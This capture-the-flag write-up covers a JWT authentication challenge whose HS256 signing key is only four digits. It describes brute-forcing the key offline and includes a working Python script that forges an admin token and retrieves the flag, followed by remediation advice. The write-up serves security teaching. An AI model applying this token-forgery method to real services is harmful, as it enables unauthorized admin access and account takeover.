# PocketBank_Lite - JWT HS256 signed with a brute-forceable 4-digit key

| | |
|---|---|
| **Challenge** | PocketBank_Lite |
| **Category** | AUTH |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://auth8.chal.deti:8067 |
| **Auth weakness** | CWE-327 - weak/risky crypto (HMAC key = 4 digits) |
| **Creds given** | customer / customer123 |

## Hint
> Four digits hold the whole lock shut - small enough to try every one.

## Recon
- Login (`account`/`password`) sets a **JWT in the `token` cookie** (the dashboard
  HTML has no token - only the `Set-Cookie` header does):
  - header `{"alg":"HS256","typ":"JWT"}`
  - payload `{"account":"customer","role":"customer","iat":...}`
- Gated endpoint: **`GET /accounts/admin`**, token sent as
  `Authorization: Bearer <token>`.

## Approach
CWE-327: the JWT is HS256-signed with a **4-digit secret** (0000–9999), so the
key can be brute-forced **offline** against our own valid token in <1s. With the
key recovered we can sign arbitrary tokens - so we mint a `role:admin` token and
present it to `/accounts/admin`.

Key crack: for each `NNNN`, compute `HMAC-SHA256(NNNN, header + "." + payload)`
(base64url) and compare to the token's signature → **secret = `0468`**.

> Note: the admin data lives *only* at `/accounts/admin` via the Bearer header - > the `/dashboard` cookie view just reflects whatever `account` you claim, so it
> was a dead end for the flag.

## Exploitation - the exact flow
```bash
# key cracked to 0468 (see solve.py). Forge + present:
python3 - <<'PY'
import base64,hashlib,hmac,json,urllib.request,re
KEY='0468'; BASE='http://auth8.chal.deti:8067'
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=').decode()
h=b(b'{"alg":"HS256","typ":"JWT"}')
p=b(json.dumps({"account":"admin","role":"admin","iat":1794405979},separators=(',',':')).encode())
sig=b(hmac.new(KEY.encode(),f"{h}.{p}".encode(),hashlib.sha256).digest())
tok=f"{h}.{p}.{sig}"
req=urllib.request.Request(BASE+'/accounts/admin',headers={'Authorization':f'Bearer {tok}'})
print(re.search(r'flag\{[^}]*\}',urllib.request.urlopen(req).read().decode()).group(0))
PY
```
(`solve.py` automates login → crack → forge → fetch.)

## Flag
```
flag{872abb8386b9a298b1cc1c75e5de834e}
```

## Root cause & remediation
- **Cause:** the JWT signing key is a 4-digit number - only 10,000 possibilities,
  trivially brute-forced offline (CWE-327). Anyone with one valid token can
  recover the key and forge tokens for any identity/role.
- **Fix:** use a long, high-entropy random signing secret (≥256-bit) or
  asymmetric keys (RS256/ES256); rotate secrets; and don't derive authorization
  solely from self-signed token claims - check against a server-side identity.
